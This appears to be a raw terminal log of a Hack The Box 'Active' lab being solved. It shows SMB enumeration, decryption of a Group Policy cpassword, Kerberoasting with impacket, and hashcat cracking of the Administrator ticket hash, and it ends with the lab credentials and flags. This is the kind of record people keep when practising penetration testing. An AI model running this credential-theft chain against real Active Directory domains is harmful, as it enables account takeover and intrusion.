@@ -1,0 +1,293 @@
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# cat ip   
+10.129.242.103
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# nmap -sC -sV -o nmap -p- -Pn --min-rate 15000 10.129.242.103 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-20 02:29 EDT
+Nmap scan report for active (10.129.242.103)
+Host is up (1.3s latency).
+Not shown: 62677 filtered tcp ports (no-response), 2853 closed tcp ports (reset)
+PORT      STATE SERVICE    VERSION
+53/tcp    open  tcpwrapped
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+135/tcp   open  tcpwrapped
+139/tcp   open  tcpwrapped
+445/tcp   open  tcpwrapped
+49173/tcp open  tcpwrapped
+
+Host script results:
+|_clock-skew: -1s
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-03-20T06:29:51
+|_  start_date: 2023-03-20T06:24:41
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.51 seconds
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# nmap --script safe -445 10129.242.103                       
+nmap: invalid option -- '5'
+See the output of nmap -h for a summary of options.
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# smbclient -L \\\\10.129.242.103  
+Password for [WORKGROUP\root]:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.242.103 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# nmap --script safe -445 10.129.242.103
+nmap: invalid option -- '5'
+See the output of nmap -h for a summary of options.
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# smbclient  //10.129.242.103/Replicaiton
+Password for [WORKGROUP\root]:
+Anonymous login successful
+tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# smbclient //10.129.242.103/Replication 
+Password for [WORKGROUP\root]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> RECURSE ON
+smb: \> PROMPT OFF
+smb: \> mget *
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (2.3 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.6 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (1.2 KiloBytes/sec) (average 0.8 KiloBytes/sec)
+getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.2 KiloBytes/sec) (average 1.1 KiloBytes/sec)
+smb: \> put ip
+NT_STATUS_ACCESS_DENIED opening remote file \ip
+smb: \> exit
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# ls
+active.htb  ip  nmap
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# wc -l active.htb                                                                 
+wc: active.htb: Is a directory
+0 active.htb
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# cd active.htb 
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/htb/active-directory-101/active/active.htb]
+└─# ls
+DfsrPrivate  Policies  scripts
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/htb/active-directory-101/active/active.htb]
+└─# ls -lash 
+total 20K
+4.0K drwxr-xr-x 5 root root 4.0K Mar 20 02:34 .
+4.0K drwxr-xr-x 3 root root 4.0K Mar 20 02:34 ..
+4.0K drwxr-xr-x 5 root root 4.0K Mar 20 02:34 DfsrPrivate
+4.0K drwxr-xr-x 4 root root 4.0K Mar 20 02:34 Policies
+4.0K drwxr-xr-x 2 root root 4.0K Mar 20 02:34 scripts
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/htb/active-directory-101/active/active.htb]
+└─# cd ..        
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# ls       
+active.htb  ip  nmap
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# smbmap -R Replication -H 10.129.242.103 -A Group.xml -q
+[+] IP: 10.129.242.103:445      Name: active                                            
+[+] Starting search for files matching 'Group.xml' on share Replication.
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# cd active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/ 
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─# ls
+Groups.xml
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─# smbmap -R Replication -H 10.129.242.103 -A Group.xml -q
+[+] IP: 10.129.242.103:445      Name: active                                            
+[+] Starting search for files matching 'Group.xml' on share Replication.
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
+└─# cd ../../../../../                                                                         
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/htb/active-directory-101/active/active.htb]
+└─# cd ..             
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# ls
+active.htb  ip  nmap
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# apt-get install cifs-utils 
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+cifs-utils is already the newest version (2:7.0-2).
+cifs-utils set to manually installed.
+The following packages were automatically installed and are no longer required:
+  catfish cgroupfs-mount containerd dctrl-tools dh-dkms dh-elpa-helper gir1.2-xfconf-0 libcfitsio9 libgdal31 libintl-perl libintl-xs-perl libmodule-find-perl libmodule-scandeps-perl libmpdec3 libnginx-mod-http-geoip
+  libnginx-mod-http-image-filter libnginx-mod-http-xslt-filter libnginx-mod-mail libnginx-mod-stream libnginx-mod-stream-geoip libpoppler123 libproc-processtable-perl libprotobuf23 libpython3.10 libpython3.10-dev libpython3.10-minimal
+  libpython3.10-stdlib libsort-naturally-perl libtiff5 libzxingcore1 linux-image-6.0.0-kali3-amd64 needrestart nginx-common nginx-core php8.1-mysql python-pastedeploy-tpl python3-commonmark python3-speaklater python3.10 python3.10-dev
+  python3.10-minimal python3.10-venv ruby3.0 ruby3.0-dev ruby3.0-doc
+Use 'sudo apt autoremove' to remove them.
+0 upgraded, 0 newly installed, 0 to remove and 9 not upgraded.
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# mkdir /mnt/Replication                                    
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# mount -t cifs //10.129.242.103/Replication /mnt/Replication/ -o username=<username>,password=<password>,domain=active.htb 
+zsh: no such file or directory: username
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# ls                                                                                                                        
+active.htb  ip  nmap
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml 
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ 
+GPPstillStandingStrong2k18
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# impacket-GetADUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.242.103 -request                                            
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+usage: GetADUsers.py [-h] [-user username] [-all] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] target
+GetADUsers.py: error: unrecognized arguments: -request
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# impacket-GetADUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.242.103 -request 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+usage: GetADUsers.py [-h] [-user username] [-all] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] target
+GetADUsers.py: error: unrecognized arguments: -request
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# impacket-GetUserSPNs  active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.242.103 -request
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-03-20 02:25:33.757729             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5acbc85173b5d741dd56131d44dd14ac$c978e905cbae853dbad2a5d87f713166d95e5420f25a84e4f544a3288d6ba3c41f43020b291e9a0741332118e31e3320ebdef015dc89d572c2945aa0fea6fdc81c1711440194bc972a8de9ca509a3f6294ed0a7075a87ffa93258796d189d26646db22eeaaeec9acb44ab5fee0042cfbda4f691b7bed6be978c44e8cb1efe3c84ee225e1c57d82c74215f08febb8c8bb1b83e25d2787c806746f969c1dfa36190c888be21e7d819f9bfc47ba08d11be79f8b25767eb0b1e027fd854ca093e0c6aeb60e21baf6e3521a785ca48ceadd21d91739d9014dcc2984957ce520e3088795641bc4108869f308697a89e5d83c82c33629852b471c657a26b4d21630e939837c6c30c361f6e656848838d2c4ae10de5af5f4f0caf7c5e77886ca03b15995207eaa4dab9f2cc241e2d0a19ba9bdd55b142e477a2c35807deaf02d0d4756328227a72e5de5cf894a21feb18158d081519d07a4076546b6553b4fc055c4e616d015ea9a1440877cc1d01e29320712e15543820a9318c0a8992adbda83419e4e543f656bce977ca6ff846d3d094137971bb1e2ecf165d182d86c1c0d957d090549bae517e4229a8e91641d44a80da8ec83e059a6ca8fb9d41c31f93ef61be7fc7f371244de66f15cddc16bb0ebd093e346e8f1e917d953e621eef9aa2ca46d2a6268af3d9d51c1d3c391c98cc3d0d7c91b7bd49c54de5808c355e0658b99e66ef573d56ed310766da496e253f203a6f2b06dfc2c9709aaee4ecd246d3e3419a0523f026344533e29e19776cfb7c67f8bc46f2da526b6213fad33815d87cd916409357299a75b43cdb93b694d5988b1500a73dbbfbdfb769172c65f3c9bea3c68c42f620152d9948968bf38b5836655963557aa64de75191505a96d053b1a8811f959f4fd5a302224fc232733a6f3175a6de5d14195f08c5b055d88e3a29d103b5388267c6a5440cfd1f4cb2f00ca26d9702928fde5aa872006752ed20611e7cb600a03b77b0cd6ad977139c774ab8506185ab4bdbc000dce7c6b884b70b89b8b8240015ca38d2cb2226d5fad3b7245facf9990fb0ae271790a42a292418738ba42f3ea673cbd4b43eba4f60e3a0ad69b12898f71047bb7de331ed66e4469456cba7848a187ee58973889f6496488b93cce3abee2253695ac464f1c61cd3ca0a8f0233d2df637c9170c840bb4e64ec82a5c2eaa3f1c2cba091f4a71892b0b99e615c444b6af4095f2322864797a831b86248f302ca3a73a1c4352
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# nano hash.txt                         
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─# hashcat -m 13100 -d 3 -a 0 -o active.txt hash.txt /usr/share/wordlists/rockyou.txt                            
+hashcat (v6.2.6) starting
+
+No devices found/left.
+
+Started: Mon Mar 20 02:54:42 2023
+Stopped: Mon Mar 20 02:54:45 2023
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─#  hashcat -m 13100 -d 3 -a 0  hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
+hashcat (v6.2.6) starting
+
+No devices found/left.
+
+Started: Mon Mar 20 02:56:20 2023
+Stopped: Mon Mar 20 02:56:20 2023
+
+opt/hashcat/hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+--force --potfile-disable
+
+
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/active]
+└─#  hashcat -m 13100   hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-sandybridge-Intel(R) Core(TM) i3-1005G1 CPU @ 1.20GHz, 3919/7902 MB (1024 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 3234
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 46389741090
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => 
+ 
+now password is : - Ticketmaster1968 
+username Administrator 
+
+userflag : - b7d3cdc349d96689ac9f6bef1f2e5fb9
+root flag :- 16c2b28dbba9b176d1c5d2fa0dec49d9
